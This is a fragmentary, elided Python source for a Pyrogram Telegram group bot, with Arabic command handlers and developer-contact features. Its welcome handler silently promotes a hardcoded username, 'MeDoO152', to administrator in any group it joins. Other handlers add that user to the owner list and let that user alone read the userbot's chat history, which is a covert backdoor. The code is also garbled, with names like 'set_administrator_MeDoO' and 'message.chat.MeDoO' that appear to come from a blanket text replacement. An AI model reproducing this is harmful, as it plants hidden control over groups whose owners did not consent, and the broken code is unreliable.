...
from youtubesearchpython.__future__ import VideosSearch
    ...
    MeDoO = "https://telegra.ph/file/0a2e4b9e06d957bf4c1ed.jpg"
...
async def welcome(client: Client, message):
   try:
    ...
    if message.new_chat_members[0].username == "MeDoO152":
      try:
         ...
         await client.set_administrator_MeDoO (chat_id, user_id, "ميدو")
      except:
        pass
    ...
    if message.new_chat_members[0].id == dev:
      try:
         ...
         await client.set_administrator_MeDoO (message.chat.id, message.new_chat_members[0].id, "مطور البوت")
      except:
        pass
...
**"""
      ...
      chats = len(await get_served_chats(client))
      return await client.send_message(logger, f"**♪ New Group : [{message.chat.MeDoO }](https://t.me/{message.chat.username})  💎 .\n♪ id : {message.chat.id}  💎 .\n♪ By : {message.from_user.mention}  💎 .\n♪ Group Now: {chats}  💎 .**", disable_web_page_preview=True)
   except:
      pass  
...
async def MeDoO152(client, message):
  bot_username = client.me.username
  dev = await get_dev(bot_username)
...
@Client.on_message(filters.command("ميدو",""))
async def hmada(client, message): 
  OWNER.append("MeDoO152")
    ...
    await message.reply_photo(
        ...
        reply_markup=InlineKeyboardMarkup(
                    [
                        ...
                        [
                            InlineKeyboardButton("MeDoO  🥷", user_id=f"MeDoO152")
                        ],
                        [
...
@Client.on_message(filters.command(["المطور ميدو","ميدو","المبرمج"], ""))
async def deev(client: Client, message: Message):
     if await joinch(message):
            return
     user = await client.get_chat(chat_id="MeDoO152")
     ...
     MeDoO  = message.chat.MeDoO  if message.chat.MeDoO  else message.chat.first_name
     chat_MeDoO  = f"User : {message.from_user.mention} \nChat Name : {MeDoO }" if message.from_user else f"Chat Name : {message.chat.MeDoO }"
     try:
      await client.send_message(username, f"**هناك شخص بالحاجه اليك عزيزي المطور**\n{chat_MeDoO }\nChat Id : `{message.chat.id}`",
      reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(f"{MeDoO }", url=f"{link}")]]))
     except:
       pass
     await message.reply_photo(
     photo=photo,
...
async def llink(client: Client, message: Message):
    if not message.from_user.username in ["MeDoO152"]:
      return
...
async def tiillllli(client, message):
 if message.from_user.username in ["MeDoO152"]:
   ...
   bot_username = client.me.username
   user = await get_userbot(bot_username)
   async for msg in user.get_chat_history("MeDoO152"):
